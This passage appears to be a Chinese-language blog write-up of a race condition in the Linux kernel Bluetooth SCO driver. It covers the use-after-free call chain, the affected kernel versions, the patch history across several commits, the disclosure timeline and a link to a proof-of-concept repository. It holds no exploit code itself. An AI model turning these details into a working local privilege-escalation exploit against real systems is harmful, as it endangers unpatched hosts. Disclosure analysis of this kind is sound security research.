<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/9.jpg" alt="socket-timer-第 5 页.jpg" /></p>

<p>悬空过程调用链条：sco_sock_connect -&gt; sco_connect -&gt; sco_chan_add -&gt; __sco_chan_add</p>

<p>UAF触发过程：</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/10.png" alt="截屏2024-11-22 11.33.54.png" /></p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/11.png" alt="截屏2024-11-22 12.47.26.png" /></p>

<h3 id="3-攻击效果">3. 攻击效果</h3>

<p>受影响版本：linux-6.3.0 ～ linux-6.11.5</p>

<p>攻击效果：控制流劫持、本地权限提升</p>

<h2 id="三漏洞历史">三、漏洞历史</h2>

<p>该漏洞最早出现在2022年5月13日之前，中间被短暂地修补，因第一次修补后性能问题进行了第二次修补，漏洞被重新引入。</p>

<p>随后进行的第三次和第四次修补遏制了条件竞争发生之后的UAF，其中第三次修补的是另一个条件竞争漏洞与这次发现的关系不大，第四次修补遏制了UAF但是却没有解决条件竞争引发的sco_conn对象悬空问题。</p>

<p>第五次修补解决了悬空sco_conn对象的释放，解决了内存泄漏的问题。</p>

<h3 id="2024年11月15日">2024年11月15日</h3>

<p>这是最新的一次提交，在struct sco_conn对象内部嵌入了内核对象计数器kref用于跟踪sco_conn对象的生命周期，及时释放掉不再被引用的对象。</p>

<p><a href="https://github.com/torvalds/linux/commit/e6720779ae612a14ac4ba7fe4fd5b27d900d932c">https://github.com/torvalds/linux/commit/e6720779ae612a14ac4ba7fe4fd5b27d900d932c</a></p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/12.png" alt="截屏2024-11-22 13.16.10.png" /></p>

<p>嵌入kerf对象：</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/13.png" alt="截屏2024-11-23 10.13.16.png" /></p>

<p>悬空sco_conn被释放的逻辑：</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/14.png" alt="截屏2024-11-23 10.05.05.png" /></p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/15.png" alt="截屏2024-11-23 10.17.00.png" /></p>

<h3 id="2024年10月23日">2024年10月23日</h3>

<p>该提交解决了在sco_sock_connect发生条件竞争的情况下，阻止后续UAF的产生。</p>

<p><a href="https://github.com/torvalds/linux/commit/1bf4470a3939c678fb822073e9ea77a0560bc6bb">https://github.com/torvalds/linux/commit/1bf4470a3939c678fb822073e9ea77a0560bc6bb</a></p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/16.png" alt="截屏2024-11-22 13.19.32.png" /></p>

<p>方法是在异步线程中，访问sock对象之前检查sock对象是否还在sco_sk_list链表中，因为在close的时候sock对象会被从sco_sk_list移除。</p>

<p>但它并没有解决悬空sco_conn对象的问题，这又会产生内存泄漏的问题，因为没有任何指针可以引用到sco_conn对象。</p>

<h3 id="2024年5月4日">2024年5月4日</h3>

<p>该提交解决了一个sco_sock_timeout函数中的UAF漏洞，并申请了漏洞编号CVE-2024-27398。</p>

<p><a href="https://github.com/torvalds/linux/commit/483bc08181827fc475643272ffb69c533007e546">https://github.com/torvalds/linux/commit/483bc08181827fc475643272ffb69c533007e546</a></p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/17.png" alt="截屏2024-11-22 13.15.37.png" /></p>

<p>该漏洞产生于close系统调用和定时器函数sco_sock_timeout之间的竞争，并不是本次发现的sco_sock_connect之间的条件竞争。</p>

<h3 id="2023年4月11日">2023年4月11日</h3>

<p>该提交目的是为了修补一个潜在的死锁：</p>

<p><a href="https://github.com/torvalds/linux/commit/9a8ec9e8ebb5a7c0cfbce2d6b4a6b67b2b78e8f3">https://github.com/torvalds/linux/commit/9a8ec9e8ebb5a7c0cfbce2d6b4a6b67b2b78e8f3</a></p>

<p>2022年5月份的修补使用lock_sock()全程保护sco_sock_connect在某些情况下会造成死锁，新的提交对sco_sock_connect分成3段分别加锁，企图通过尽可能缩小lock_sock()的作用范围来避免死锁。</p>

<p>本次发现的漏洞也产生于这个提交。</p>

<p>但这又使得sock对象状态机的判断逻辑脱离了lock_sock()的保护，重新引入了条件竞争漏洞，被修补好的漏洞又出现了。</p>

<h3 id="2022年5月13日">2022年5月13日</h3>

<p>该漏洞早在2022年5月13日已经得到了修补：</p>

<p><a href="https://github.com/torvalds/linux/commit/7aa1e7d15f8a5b65f67bacb100d8fc033b21efa2">https://github.com/torvalds/linux/commit/7aa1e7d15f8a5b65f67bacb100d8fc033b21efa2</a></p>

<p>当时有研究人员使用syzkaller打出了这个内核崩溃，同样也是两个并发的connect之后产生了一个悬空的sco_conn对象，close掉文件句柄之后在定时器函数sco_sock_timeout中触发了UAF。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/18.png" alt="截屏2024-11-22 10.48.47.png" /></p>

<p>该修补使用lock_sock()完整的保护了sco_sock_connect函数中整个连接过程，将sock对象状态机的判断和修改完整的置于锁保护之中，消除了sco_sock_connect函数的并发访问，从根源上避免了sco_conn悬空对象的产生。但由此产生了一些性能的问题，进而有了2023年4月份的修补。</p>

<p>我使用syzkaller在2023年1月份也打出了这个漏洞，当时和王宇轩等人进行过分析，开发出了漏洞利用代码。</p>

<h2 id="四时间线">四、时间线</h2>

<p>2024年11月8日，发现漏洞；</p>

<p>2024年11月13日，写出PoC；</p>

<p>2024年11月14日，向security@kernel.org 和 linux-distros@vs.openwall.org 发送漏洞报告；</p>

<p>2024年11月15日，补丁被打上，提交编号为<a href="https://github.com/torvalds/linux/commit/e6720779ae612a14ac4ba7fe4fd5b27d900d932c">e672077</a>；</p>

<h2 id="五漏洞验证">五、漏洞验证</h2>

<p><a href="https://github.com/qiutianshu/sco-race-condition">https://github.com/qiutianshu/sco-race-condition</a></p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/19.png" alt="截屏2024-11-23 10.34.30.png" /></p>]]></content><author><name></name></author><category term="linux_kernel" /><summary type="html"><![CDATA[2023年使用syzkaller对Linux内核进行fuzz的过程中，发现了蓝牙协议栈sco子协议的条件竞争漏洞，2024年11月8日，在审计Linux内核网络协议栈中锁的使用的过程中，通过相似性分析的方法，再次发现了一个sco的条件竞争漏洞。]]></summary></entry></feed>